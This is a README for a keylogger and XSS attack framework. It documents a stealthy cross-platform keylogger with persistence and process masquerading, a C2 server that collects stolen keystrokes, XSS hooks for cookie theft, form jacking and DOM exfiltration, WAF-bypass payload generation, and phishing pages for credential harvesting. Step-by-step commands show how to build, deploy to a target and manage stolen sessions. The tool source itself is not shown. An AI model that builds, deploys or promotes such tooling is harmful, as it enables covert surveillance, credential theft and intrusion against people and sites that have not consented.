# KLG-XSS HAILAMDEV Framework

Complete keylogger (KLG) and Cross-Site Scripting (XSS) attack framework with C2 infrastructure.

## Architecture

```
KLG-XSS-HAILAMDEV/
├── core/
│   ├── keylogger.py          # Cross-platform keylogger with persistence
│   └── xss_framework.py      # XSS payload generator, scanner, exploit framework
├── server/
│   └── c2_server.py          # Flask C2 server (keylogger + XSS hooks)
├── modules/
│   ├── klg_tool.py           # Keylogger management CLI
│   └── xss_tool.py           # XSS operations CLI
├── deploy/
│   └── build.py              # Multi-platform deployment builder
├── config/
│   └── default.json          # Configuration
├── launcher.py               # Unified entry point
└── requirements.txt
```

## Features

### Keylogger (KLG)
- **Cross-platform**: Windows, macOS, Linux
- **Persistence**: Registry (Win), LaunchAgents (macOS), autostart (Linux)
- **Capture**: Keystrokes, mouse clicks/scroll, clipboard, screenshots
- **Targeting**: Per-application filtering (include/exclude lists)
- **Encryption**: Fernet-encrypted payloads to C2
- **Stealth**: No console, minimal footprint, process masquerading

### XSS Framework
- **Payload Generation**: 5 contexts (HTML, Attribute, JS, CSS, Event handlers)
- **WAF Bypass**: Case randomization, comment insertion, encoding, junk insertion
- **Polyglot Payloads**: Multi-context payloads
- **Scanner**: Reflected, Stored, DOM-based, Blind XSS detection
- **Campaign Management**: Multi-target scanning with reporting
- **Hook System**: BeEF-style browser hooks with keylogging, form jacking, DOM exfil
- **Phishing Pages**: Template-based credential harvesting pages

### C2 Server
- **REST API**: Keylogger upload, session management, XSS hook registration
- **Admin Panel**: Web UI at `/admin`
- **Tasking**: Command queue for keylogger sessions
- **Database**: SQLite persistence
- **Hook Endpoints**: `/hook/<id>` for XSS callbacks, `/hook/<id>.js` for BeEF-style hooks

## Quick Start

### 1. Install Dependencies
```bash
pip install -r requirements.txt
```

### 2. Start C2 Server
```bash
python launcher.py c2 --host 0.0.0.0 --port 8080
```

### 3. Deploy Keylogger
```bash
# Build for target platform
python launcher.py build --platform windows --c2 http://YOUR_C2_IP:8080

# Deploy package in deploy/windows/ to target
# Run install.bat as target user
```

### 4. Run Keylogger Directly (Testing)
```bash
python launcher.py keylogger --c2 http://localhost:8080
```

### 5. Generate XSS Payloads
```bash
# Basic payloads
python launcher.py xss generate --context HTML_BODY --count 20

# WAF bypass payloads
python launcher.py xss generate --context HTML_BODY --waf --count 30

# Encoded payloads
python launcher.py xss generate --context HTML_ATTRIBUTE --encode html --count 10

# Mutated payloads
python launcher.py xss generate --context JAVASCRIPT --mutate 5
```

### 6. Scan for XSS
```bash
python launcher.py xss scan --url "http://target.com/search" --param q --waf
```

### 7. Run XSS Campaign
```bash
# Single target
python launcher.py xss campaign --name "test" --url "http://target.com" --param search

# Multiple targets from CSV
python launcher.py xss campaign --name "batch" --target-file targets.csv --c2 http://C2_IP:8080
```

### 8. Generate Phishing Page
```bash
python launcher.py xss phishing --target-url "http://target.com/login" --template login --output phish.html
```

### 9. Manage Sessions
```bash
# List keylogger sessions
python launcher.py manage list --c2 http://C2_IP:8080

# View session events
python launcher.py manage get --c2 http://C2_IP:8080 --session-id SESSION_ID

# Export session
python launcher.py manage export --c2 http://C2_IP:8080 --session-id SESSION_ID --output session.json
```

## Configuration

Edit `config/default.json`:
- C2 server settings
- Keylogger capture options
- XSS payload preferences
- Deployment targets

Environment variables:
- `C2_KEY` - Fernet encryption key for C2
- `KLG_KEY` - Keylogger encryption key

## Deployment

### Windows
```bash
python launcher.py build --platform windows --c2 http://C2_IP:8080
# Copy deploy/windows/ to target
# Run install.bat
```

### macOS
```bash
python launcher.py build --platform macos --c2 http://C2_IP:8080
# Copy deploy/macos/ to target
# Run ./install.sh
```

### Linux
```bash
python launcher.py build --platform linux --c2 http://C2_IP:8080
# Copy deploy/linux/ to target
# Run ./install.sh
```

## API Endpoints

### Keylogger
- `POST /api/keylogger/upload` - Upload encrypted events
- `GET /api/keylogger/sessions` - List all sessions
- `GET /api/keylogger/sessions/<id>` - Get session events
- `GET /api/keylogger/sessions/<id>/export` - Export session JSON

### XSS
- `POST /api/xss/register_hook` - Register hook payload
- `GET/POST /hook/<id>` - Hook checkin endpoint
- `GET /hook/<id>.js` - BeEF-style hook script
- `GET /api/xss/hooks` - List active hooks
- `GET /api/xss/hooks/<id>` - Get hook checkins
- `POST /api/xss/campaigns` - Create campaign

### Tasking
- `POST /api/tasks` - Create task for session
- `GET /api/tasks/<session_id>` - List tasks
- `POST /api/tasks/<task_id>/result` - Submit task result

### Admin
- `GET /admin` - Web admin panel

## XSS Payload Contexts

| Context | Use Case |
|---------|----------|
| HTML_BODY | `<div>`, `<body>`, raw HTML injection |
| HTML_ATTRIBUTE | Inside tag attributes (`value="..."`) |
| JAVASCRIPT | Inside `<script>` or JS strings |
| CSS | Inside `<style>` or style attributes |
| EVENT_HANDLER | `onload=`, `onerror=`, `onclick=` etc. |
| IFRAME | `src=` in iframe |
| URL | In URL parameters |

## Hook Capabilities

Deployed hooks can:
- Keystroke logging (`keylogger` template)
- Cookie theft (`cookie_steal` template)
- Form jacking (`form_jack` template)
- DOM exfiltration (`dom_exfil` template)
- BeEF integration (`beef_hook` template)

## Security Notes

- All keylogger traffic encrypted with Fernet (AES-128)
- C2 supports optional API key authentication
- Hooks use randomized IDs
- Payloads support multiple encoding layers
- WAF bypass mutations applied automatically

## Requirements

- Python 3.8+
- See `requirements.txt` for dependencies
- pyinstaller for building executables
- Platform-specific: `pywin32` (Win), `pyobjc` (macOS) - auto-installed

## License

Internal use only. Unauthorized deployment prohibited.

## Author

**Author:** Nguyen Xuan Hai

- LinkedIn: [linkedin.com/in/xuanhai0913](https://www.linkedin.com/in/xuanhai0913/)
- Facebook: [facebook.com/nguyenhai0913](https://www.facebook.com/nguyenhai0913)
